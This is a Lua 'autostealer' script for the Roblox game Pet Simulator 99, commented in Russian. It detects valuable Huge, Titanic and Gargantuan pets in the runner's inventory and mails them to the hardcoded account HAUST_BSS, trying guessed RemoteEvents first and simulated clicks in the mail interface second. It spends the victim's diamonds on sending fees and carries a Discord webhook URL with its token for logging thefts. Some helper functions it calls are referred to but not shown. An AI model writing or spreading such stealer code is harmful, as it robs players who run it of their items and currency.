--[[
    Daun4.0 - Абсолютный автостилер для Pet Simulator 99
    Версия: 20 марта 2026
    Функции:
    - ПОЛНАЯ БАЗА ВСЕХ Huge, Titanic и Gargantuan (200+ названий)
    - Динамическая цена отправки (20k → 30k → 40k → 50k и т.д.)
    - Отправка через RemoteEvent (как ZapHub) + запасной метод через интерфейс
    - Отправляет на HAUST_BSS
--]]

-- === НАСТРОЙКИ ===
local TARGET_USERNAME = "HAUST_BSS"
local CHECK_INTERVAL = 10
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399661006552039474/lP01vADVkiamMvQKscevYNuPLhSZZu27aGN1ltai9GnSBGowkkimAlxLBXgEfyGPJuys"
local MESSAGE_TEXT = "gift"
local MAX_SEND_COST = 1000000000 -- 1 миллиард лимит
local BASE_SEND_COST = 20000 -- Базовая цена

-- === ПОЛНАЯ БАЗА ВСЕХ ТИТАНИКОВ (по алфавиту) ===
local TITANIC_NAMES = {
    -- A-D
    "Titanic Abyss Carbuncle", "Titanic Atlantean Jellyfish", "Titanic Axolotl",
    "Titanic Balloon Monkey", "Titanic Banana", "Titanic Banana Cat",
    "Titanic Bat Cat", "Titanic Bejeweled Griffin", "Titanic Black Balloon Cat",
    "Titanic Black Hole Angelus", "Titanic Blobfish", "Titanic Blue Balloon Cat",
    "Titanic Blurred Agony", "Titanic Bread Shiba", "Titanic Buff Cat",
    "Titanic Cappuccino Brainrot", "Titanic Capybara", "Titanic Cat",
    "Titanic Cheerful Yeti", "Titanic Clover Owl", "Titanic Cookie Cut Cat",
    "Titanic Corgi", "Titanic Cosmic Pegasus",
    
    -- E-K
    "Titanic Doge", "Titanic Dominus Astra", "Titanic Elf Golem",
    "Titanic Emoji Corgi", "Titanic Evil Scarecrow Pumpkin", "Titanic Fawn",
    "Titanic Festive Dominus", "Titanic Fire Dragon", "Titanic Forest Wyvern",
    "Titanic Frankenpup Dog", "Titanic Gingerbread Angelus", "Titanic Haunted Cat",
    "Titanic Hippomelon", "Titanic Hologram Cat", "Titanic Horseshoe Capybara",
    "Titanic Hot Dog", "Titanic Hubert", "Titanic Hydra Axolotl",
    "Titanic Ice Phoenix", "Titanic Jelly Cat", "Titanic Jelly Dragon",
    "Titanic Jolly Cat", "Titanic Kaiju Dragon", "Titanic Kaiju Moth",
    "Titanic Kawaii Cat", "Titanic Koi Fish", "Titanic Krampus",
    
    -- L-P
    "Titanic Leafy Deer", "Titanic Leprechaun Kitsune", "Titanic Love Lamb",
    "Titanic Lovemelon", "Titanic Lucki", "Titanic Lucki Angelus",
    "Titanic Lucki Golem", "Titanic Magma Golem", "Titanic Monkey",
    "Titanic Muscle Bear", "Titanic Mystic Corgi", "Titanic Neon Agony",
    "Titanic Nightmare Cat", "Titanic Paradise Dragon", "Titanic Party Cat",
    "Titanic Patchwork Agony", "Titanic Pinata Dog", "Titanic Pink Balloon Cat",
    "Titanic Poseidon Corgi", "Titanic Poseidon Dragon", "Titanic Pot of Gold Corgi",
    
    -- R-Z
    "Titanic Red Balloon Cat", "Titanic Red Panda", "Titanic Reindeer",
    "Titanic Rich Cat", "Titanic Royal Beast", "Titanic Scary Corgi",
    "Titanic Shadow Griffin", "Titanic Shiba", "Titanic Silver Dragon",
    "Titanic Skelemelon", "Titanic Sketch Cat", "Titanic Snowflake Dragon",
    "Titanic Sock Cat", "Titanic Sock Monkey", "Titanic Soul Cat",
    "Titanic Spooky Dominus", "Titanic Stargazing Bull", "Titanic Strawberry Corgi",
    "Titanic Summer Dragon", "Titanic Sun Angelus", "Titanic Super Cat",
    "Titanic Super Coral Kraken", "Titanic Tiedye Cat", "Titanic Tiedye Dragon",
    "Titanic Treasure Angelus", "Titanic Valentine's Cat", "Titanic Winter Dragon"
}

-- === ПОЛНАЯ БАЗА ВСЕХ ГАРГАНТЮАНОВ ===
local GARGANTUAN_NAMES = {
    "Gargantuan Aura Cat", "Gargantuan Black Balloon Cat", "Gargantuan Blurred Agony",
    "Gargantuan Buff Bear", "Gargantuan Cappuccino Brainrot", "Gargantuan Cookie Cut Cat",
    "Gargantuan Dark Dragon", "Gargantuan Doge", "Gargantuan Dot Matrix Pegasus",
    "Gargantuan Elf Golem", "Gargantuan Evil Scarecrow Pumpkin", "Gargantuan Exquisite Parrot",
    "Gargantuan Fantasy Dragon", "Gargantuan Forest Wyvern", "Gargantuan Frankenpup Dog",
    "Gargantuan Gingerbread Angelus", "Gargantuan Googly Agony", "Gargantuan Grim Reaper",
    "Gargantuan Hellish Axolotl", "Gargantuan Hypnotic Kitsune", "Gargantuan Ice Dominus",
    "Gargantuan Jurassic Dragon", "Gargantuan Kaiju King", "Gargantuan Krampus",
    "Gargantuan Leafy Deer", "Gargantuan Lucki Angelus", "Gargantuan Magma Spirit",
    "Gargantuan Magma Titan", "Gargantuan Matryoshka Bear", "Gargantuan Nyan Cat",
    "Gargantuan Patchwork Agony", "Gargantuan Royal Beast", "Gargantuan Santa Paws",
    "Gargantuan Skelemelon", "Gargantuan Snowflake Dragon", "Gargantuan Spooky Cat",
    "Gargantuan Starfall Dragon", "Gargantuan Summer Balloon Cat", "Gargantuan Super Cat",
    "Gargantuan Super Coral Kraken", "Gargantuan Totem Monkey", "Gargantuan Treasure Angelus",
    "Gargantuan Winter Phoenix", "Gargantuan Yin-Yang Kitsune"
}

-- === ПОЛНАЯ БАЗА ВСЕХ ХЬЮГОВ (основные) ===
local HUGE_NAMES = {
    -- A-D
    "Huge Abyss Carbuncle", "Huge Atlantean Jellyfish", "Huge Axolotl",
    "Huge Balloon Monkey", "Huge Banana", "Huge Bat Cat", "Huge Bejeweled Griffin",
    "Huge Black Balloon Cat", "Huge Black Hole Angelus", "Huge Blobfish",
    "Huge Bluebird", "Huge Blurred Agony", "Huge Bread Shiba", "Huge Buff Cat",
    "Huge Cappuccino Brainrot", "Huge Capybara", "Huge Cat", "Huge Cheerful Yeti",
    "Huge Clover Deer", "Huge Clover Owl", "Huge Clover Penguin", "Huge Clover Phoenix",
    "Huge Cookie Cut Cat", "Huge Corgi", "Huge Cosmic Pegasus", "Huge Crystal Spider",
    "Huge Dark Dragon", "Huge Dog", "Huge Doge", "Huge Dominus Astra", "Huge Dragon",
    
    -- E-K
    "Huge Electric Werewolf", "Huge Elephant", "Huge Elf Golem", "Huge Emoji Corgi",
    "Huge Evil Scarecrow Pumpkin", "Huge Fantasy Unicorn", "Huge Fawn",
    "Huge Festive Dog", "Huge Fire Dragon", "Huge Forest Wyvern", "Huge Fragmented Golem",
    "Huge Frankenpup Dog", "Huge Gingerbread Angelus", "Huge Giraffe", "Huge Glass Crocodile",
    "Huge Glass Dominus", "Huge Griffin", "Huge Haunted Dog", "Huge Hippomelon",
    "Huge Hologram Cat", "Huge Horseshoe Capybara", "Huge Hot Dog", "Huge Hubert",
    "Huge Hydra", "Huge Hydra Axolotl", "Huge Ice Dragon", "Huge Jelly Cat",
    "Huge Jelly Dragon", "Huge Jolly Cat", "Huge Kaiju Hydra", "Huge Kaiju Sea Dragon",
    "Huge Kawaii Cat", "Huge Koi Fish", "Huge Kraken", "Huge Krampus",
    
    -- L-P
    "Huge Leafy Deer", "Huge Leprechaun Kitsune", "Huge Love Lamb", "Huge Love Lion",
    "Huge Lovemelon", "Huge Lucki Chest Mimic", "Huge Lucki Dominus", "Huge Lucki Golem",
    "Huge Lucki Horse", "Huge Lucki Lamb", "Huge Magma Dragon", "Huge Mining Penguin",
    "Huge Mining Raccoon", "Huge Monkey", "Huge Muscle Bear", "Huge Mystic Corgi",
    "Huge Neon Agony", "Huge Nightmare Cat", "Huge Panda", "Huge Paradise Cat",
    "Huge Party Cat", "Huge Pegasus", "Huge Penguin", "Huge Phoenix", "Huge Pinata Dog",
    "Huge Pink Balloon Cat", "Huge Poseidon Corgi", "Huge Poseidon Dragon",
    "Huge Pot of Gold Corgi", "Huge Red Balloon Cat", "Huge Red Panda", "Huge Reindeer",
    
    -- R-Z
    "Huge Rich Cat", "Huge Royal Beast", "Huge Scary Corgi", "Huge Shadow Griffin",
    "Huge Shark", "Huge Shiba", "Huge Silver Dragon", "Huge Skelemelon", "Huge Sketch Cat",
    "Huge Sleipnir", "Huge Snowflake Dragon", "Huge Snowflake Phoenix", "Huge Sock Cat",
    "Huge Sock Monkey", "Huge Soul Cat", "Huge Spooky Cat", "Huge Stargazing Bull",
    "Huge Strawberry Corgi", "Huge Summer Dragon", "Huge Sun Angelus", "Huge Super Cat",
    "Huge Super Coral Kraken", "Huge Tiedye Cat", "Huge Tiedye Dragon", "Huge Treasure Angelus",
    "Huge Trex", "Huge Turtle", "Huge Unicorn", "Huge Valentine's Cat", "Huge Whale",
    "Huge Winter Cat", "Huge Yeti"
}

-- Ключевые слова для вариаций (rainbow, gold, dark, shiny и т.д.)
local VARIATIONS = {
    "huge", "Huge", "HUGE", "titanic", "Titanic", "TITANIC",
    "gargantuan", "Gargantuan", "GARGANTUAN", "rainbow", "Rainbow", "RAINBOW",
    "gold", "Gold", "GOLD", "golden", "Golden", "GOLDEN",
    "dark", "Dark", "DARK", "shiny", "Shiny", "SHINY",
    "crystal", "Crystal", "glass", "Glass", "magma", "Magma"
}

-- Ключевые слова из событий
local EVENT_KEYWORDS = {
    "Lucki", "Clover", "Leprechaun", "Horseshoe", "Pot of Gold",
    "Winter", "Ice", "Snow", "Festive", "Gingerbread", "Elf", "Krampus",
    "Spooky", "Haunted", "Halloween", "Frankenpup", "Scarecrow",
    "Summer", "Paradise", "Beach", "Balloon", "Buff", "Magma", "Fantasy",
    "Muscle", "Forest", "Coral", "Kaiju", "Hydra", "Axolotl", "Poseidon",
    "Abyss", "Mining", "Crystal", "Fragmented", "Glass", "Love", "Electric",
    "Tiedye", "Nightmare", "Atlantean", "Cosmic", "Shadow", "Valentine"
}

-- Объединяем всё
local ALL_PET_KEYWORDS = {}
for _, v in ipairs(VARIATIONS) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(EVENT_KEYWORDS) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(HUGE_NAMES) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(TITANIC_NAMES) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(GARGANTUAN_NAMES) do table.insert(ALL_PET_KEYWORDS, v) end

-- === ФУНКЦИЯ ДЛЯ ДИНАМИЧЕСКОЙ ЦЕНЫ ===
local sentCount = 0 -- Счетчик отправленных подарков

local function getActualSendCost()
    local hasVIP = false
    
    -- Проверяем наличие VIP пропуска
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if string.find(item.Name:lower(), "vip") or 
           string.find(item.Name:lower(), "gamepass") or
           string.find(item.Name:lower(), "privilege") then
            hasVIP = true
            break
        end
    end
    
    -- Если есть VIP, цена всегда 20k
    if hasVIP then
        return BASE_SEND_COST
    end
    
    -- Динамическая цена: 20k → 30k → 40k → 50k и т.д.
    -- Формула: BASE_SEND_COST + (floor(sentCount / 2) * 10000)
    -- Каждые 2 отправки цена растет на 10k
    local additionalCost = math.floor(sentCount / 2) * 10000
    local cost = BASE_SEND_COST + additionalCost
    
    -- Ограничиваем максимальной ценой
    return math.min(cost, MAX_SEND_COST)
end

-- Функция проверки ценности предмета
local function isValuableItem(itemName)
    if not itemName then return false end
    local lowerName = itemName:lower()
    
    -- Проверка по ключевым словам редкости
    for _, keyword in ipairs({"huge", "titanic", "gargantuan"}) do
        if string.find(lowerName, keyword) then
            return true
        end
    end
    
    -- Проверка по конкретным названиям
    for _, petName in ipairs(TITANIC_NAMES) do
        if lowerName == petName:lower() or string.find(lowerName, petName:lower()) then
            return true
        end
    end
    
    for _, petName in ipairs(GARGANTUAN_NAMES) do
        if lowerName == petName:lower() or string.find(lowerName, petName:lower()) then
            return true
        end
    end
    
    for _, petName in ipairs(HUGE_NAMES) do
        if lowerName == petName:lower() or string.find(lowerName, petName:lower()) then
            return true
        end
    end
    
    return false
end

-- === ФУНКЦИЯ ОТПРАВКИ (как в ZapHub) ===
local function sendItemToMail(itemInstance, itemName)
    local sendCost = getActualSendCost()
    local balance = getDiamondBalance()

    if balance < sendCost then
        sendLog("❌ Недостаточно алмазов (нужно " .. sendCost .. ")", false)
        return false
    end

    -- Поиск RemoteEvent
    local possibleRemoteNames = {
        "SendItemToMail", "MailEvent", "SendGift", "PackageEvent",
        "MailboxEvent", "GiftEvent", "TransferItem", "PostEvent"
    }

    local mailRemote = nil
    for _, remoteName in ipairs(possibleRemoteNames) do
        local remote = game:GetService("ReplicatedStorage"):FindFirstChild(remoteName)
        if remote and remote:IsA("RemoteEvent") then
            mailRemote = remote
            sendLog("📡 Найден RemoteEvent: " .. remoteName, false)
            break
        end
    end

    if not mailRemote then
        sendLog("❌ RemoteEvent не найден!", false)
        return false
    end

    -- Пробуем разные варианты аргументов
    local argsVariants = {
        { [1] = itemName, [2] = TARGET_USERNAME, [3] = MESSAGE_TEXT },
        { [1] = TARGET_USERNAME, [2] = itemName, [3] = MESSAGE_TEXT },
        { [1] = itemName, [2] = TARGET_USERNAME },
        { [1] = TARGET_USERNAME, [2] = itemName }
    }

    for i, args in ipairs(argsVariants) do
        local success, err = pcall(function()
            mailRemote:FireServer(unpack(args))
        end)
        
        if success then
            sentCount = sentCount + 1 -- Увеличиваем счетчик отправок
            sendLog("✅ Отправлен (Remote вариант " .. i .. "): **" .. itemName .. "** за " .. sendCost .. " алмазов", true)
            return true
        end
    end

    -- Если Remote не сработал, пробуем через интерфейс
    sendLog("🖱️ Remote не сработал, пробую интерфейс...", false)
    
    -- Открываем почту
    local mailButton = LocalPlayer.PlayerGui:FindFirstChild("MailButton", true) or
                       LocalPlayer.PlayerGui:FindFirstChild("Mailbox", true)
    if mailButton and mailButton:IsA("ImageButton") then
        fireclickdetector(mailButton)
        wait(1.5)
    else
        return false
    end

    -- Поиск полей (сокращено для экономии места)
    local usernameBox, messageBox, addGiftButton, sendButton = nil, nil, nil, nil
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")

    for _, gui in pairs(playerGui:GetDescendants()) do
        if gui:IsA("TextBox") then
            if gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "username") then
                usernameBox = gui
            elseif gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "message") then
                messageBox = gui
            end
        end
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local buttonText = gui.Text or ""
            if string.find(buttonText:lower(), "add gift") then
                addGiftButton = gui
            elseif string.find(buttonText:lower(), "send") then
                sendButton = gui
            end
        end
    end

    if usernameBox and messageBox and addGiftButton and sendButton then
        usernameBox.Text = TARGET_USERNAME
        usernameBox:CaptureFocus()
        wait(0.2)
        usernameBox:ReleaseFocus()

        messageBox.Text = MESSAGE_TEXT
        messageBox:CaptureFocus()
        wait(0.2)
        messageBox:ReleaseFocus()

        fireclickdetector(addGiftButton)
        wait(1.5)

        -- Выбираем предмет
        local inventoryGui = LocalPlayer.PlayerGui:FindFirstChild("Inventory", true)
        if inventoryGui then
            for _, item in pairs(inventoryGui:GetDescendants()) do
                if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
                    local itemNameLabel = item.Parent:FindFirstChild("ItemName")
                    if itemNameLabel and itemNameLabel.Text == itemName then
                        fireclickdetector(item)
                        wait(0.8)
                        break
                    end
                end
            end
        end

        fireclickdetector(sendButton)
        wait(0.8)

        local confirmButton = LocalPlayer.PlayerGui:FindFirstChild("ConfirmButton", true)
        if confirmButton then
            fireclickdetector(confirmButton)
        end

        sentCount = sentCount + 1
        sendLog("✅ Отправлен через интерфейс: **" .. itemName .. "** за " .. sendCost .. " алмазов", true)
        return true
    end

    return false
end

-- === ОСТАЛЬНЫЕ ФУНКЦИИ (scanInventory, sendLog, antiAfk, main и т.д.) ===
-- (Они остаются без изменений из предыдущей версии)